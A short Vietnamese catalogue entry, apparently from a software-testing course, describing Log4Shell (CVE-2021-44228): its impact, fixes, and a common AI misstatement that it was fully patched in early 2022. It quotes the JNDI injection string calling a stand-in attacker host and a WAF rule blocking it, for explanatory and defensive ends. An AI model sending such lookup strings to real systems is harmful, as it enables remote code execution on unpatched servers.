# Lỗi 4: Log4Shell — CVE-2021-44228 (Khai thác kéo dài 2022) (Tháng 1/2022)

* **Nguồn tham khảo:** [Wikipedia](https://en.wikipedia.org/wiki/Log4Shell)
* **Mô tả lỗi:** Apache Log4j 2 không sanitize đầu vào người dùng — kẻ tấn công gửi chuỗi '${jndi:ldap://attacker.com/x}' trong HTTP header/login form. Server log chuỗi này -> JNDI lookup -> tải và thực thi Java class từ xa (RCE). CVSS 10.0/10.
* **Độ nghiêm trọng (Severity - ISTQB):** Critical (Nguy kịch). Được gọi là 'lỗ hổng tệ nhất trong thập kỷ.' Log4j xuất hiện trong hàng nghìn sản phẩm từ Apache Struts, Solr đến các hệ thống SCADA công nghiệp.
* **Hậu quả:** Akamai ghi nhận ~2 triệu lượt khai thác/giờ. Ransomware, cryptominer, backdoor được cài trên hàng trăm triệu thiết bị. VMware, Apple, Cisco, game Minecraft đều bị ảnh hưởng. Vẫn còn bị khai thác năm 2022–2024.
* **Giải pháp khắc phục:** Nâng cấp lên Log4j 2.17.1+; vô hiệu hóa JNDI lookups; bổ sung WAF rules chặn chuỗi '${jndi:'; network egress filtering để ngăn callback ra ngoài. CISA phát hành scanner tự động phát hiện version lỗi thời.
* **Nhận diện AI Ảo giác / Thiên vị:** AI thường nói Log4Shell 'đã được vá hoàn toàn vào đầu 2022' — tạo cảm giác sai về mức độ bảo mật thực tế. Trên thực tế, CISA xác nhận hệ thống dễ bị tổn thương tiếp tục bị khai thác đến ít nhất năm 2024 do hàng triệu ứng dụng legacy chưa patch. Đây là thiên vị quá lạc quan (optimism bias) — AI có xu hướng tin rằng một lỗ hổng nổi tiếng sẽ được vá nhanh và toàn diện, điều không đúng trong môi trường enterprise thực tế.
